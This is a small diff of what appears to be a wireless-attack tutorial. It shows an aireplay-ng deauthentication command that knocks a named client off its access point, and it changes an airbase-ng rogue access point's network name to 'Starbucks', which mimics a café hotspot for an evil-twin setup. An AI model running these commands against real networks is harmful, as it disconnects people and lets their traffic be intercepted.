@@ -75,7 +75,7 @@ aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 the client will be disconnected from the AP we input above 
 
 ```
-airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'BeautifulSoup' -c 11 wlan0mon
+airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'Starbucks' -c 11 wlan0mon
 ```
 
 -a :set up MAC address 
